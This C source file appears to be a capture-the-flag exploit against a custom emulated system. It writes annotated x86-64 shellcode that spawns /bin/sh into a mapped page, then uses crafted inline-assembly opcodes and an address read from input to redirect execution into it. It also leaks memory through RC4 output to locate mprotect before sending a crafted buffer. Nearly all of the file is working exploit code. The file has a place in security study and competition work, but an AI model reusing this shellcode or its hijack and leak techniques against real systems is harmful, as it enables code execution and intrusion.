#include "include/syscall.h"
#include "include/sha256.h"
#include "include/rc4_acc.h"

void main( void );

void _start( void )
{
	main();
}

inline uint8_t GetCharFromHex( uint8_t val )
{
	if ( val < 10 )
		return ('0'+val);
	else
		return ('a'+(val-10));
}

inline uint8_t HexToInt( uint8_t val )
{
	if ( val >= '0' && val <= '9' )
		return (val-'0');
	else if ( val >= 'A' && val <= 'F' )
		return (10 + (val-'A'));
	else if ( val >= 'a' && val <= 'f' )
		return (10 + (val-'a'));
	else
		return 0;
}

inline void PrintDWORD( uint32_t value )
{
	uint8_t writeVal;
	for ( uint32_t i = 0; i < 4; i++ )
	{
		uint8_t byte = (value >> ((3-i)*8)) & 0xFF;

		writeVal = GetCharFromHex( (byte & 0xF0) >> 4 );

		write( 1, &writeVal, 1 );

		writeVal = GetCharFromHex( (byte & 0xF) );

		write( 1, &writeVal, 1 );		
	}

	writeVal = '\n';
	write( 1, &writeVal, 1 );

}

inline uint32_t ReadDWORD( void )
{
	uint32_t dword = 0;;
	for ( uint32_t i = 0; i < 4; i++ )
	{
		uint8_t value;
		uint8_t input;

		read( 0, &input, 1 );	
		value = (HexToInt( input ) << 4);

		read( 0, &input, 1 );
		value |= (HexToInt( input ));

		dword = dword << 8;
		dword |= value;
	}

	return (dword);
}


uint8_t g_readBuf[0x1000];

void Test( void )
{
	uint32_t t2_value, t3_value;
	uint32_t dword;
	uint32_t i;
	char shellcode[] =
    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
    "\x53"                                          // push   %rbx
    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
    "\x48\x31\xc0"				    // xor    %rax, %rax
    "\x50"                                          // push   %rax
    "\x57"                                          // push   %rdi
    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
    "\x48\x89\xec"				    // mov    %rsp, %rbp
    "\xb0\x3b"                                      // mov    $0x3b, %al
    "\x0f\x05";

	PrintDWORD( rand() );
	PrintDWORD( rand() );
	PrintDWORD( rand() );

	uint8_t *pMapPage = (uint8_t *)mmap( 0x450000, 0x2000, 0x3 );

	PrintDWORD( (uint32_t)pMapPage );

	for ( i = 0; i < sizeof(shellcode); i++ )
		pMapPage[i] = shellcode[i];

	dword = ReadDWORD();

	t3_value = (0x4000 | ((dword >>20) & 0xFFF));
	t2_value = ((dword << 12) & 0xFFFFF000);

	__asm__ ("li $s4, -1" );
	__asm__ ("move $t2, %0"
			:
			: "r" (t2_value)
			: "t2" );
	__asm__ ("move $t3, %0"
			:
			: "r" (t3_value)
			: "t3" );
	//__asm__ ("li $t2, 0x4242" );
	//__asm__ ("li $t3, 0x4141" );
	__asm__ (".long 0x08000004");
	__asm__ (".long 0xCFE00000");	// Halt and Spontaneously Combust
}

void main()
{
	int i;
   	uint32_t shellcode[18] = { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xAAAAAAAA, 0xAAAAAABB, 0xAAAAAACC, 0xAAAAAADD, 0xAAAAAAEE, 0xAAAAAAFF, 0xAAAABBAA, 0xAAAABBBB, 0xAAAABBCC, 0xAAAABBDD }; 
	uint8_t readChar;
	uint32_t blah;

	Test();

	// Just wait for a byte.
	int readBytes = read( 0, &readChar, 1 );

	// GET DATA
	for ( i = 0; i < 256; i++ )
		g_readBuf[i] = 0;

	RC4Encrypt( g_readBuf, 0xFF );

	for ( i = 0; i < 512; i++ )
		g_readBuf[i] = 0;

	blah = time();
	RC4Encrypt( g_readBuf, 0x1FC );

	write( 1, g_readBuf, 0x1FC );

	// VERIFY where we think mprotect is:
	uint32_t mprotect_addr = *((uint32_t *)(g_readBuf + 0x1A0));
	mprotect_addr += 0x82708;

	write( 1, &mprotect_addr, 4 );
		

	// THROW
	RC4Init( (uint8_t *)shellcode, 72, 0 );

	exit(0);
	return;
}
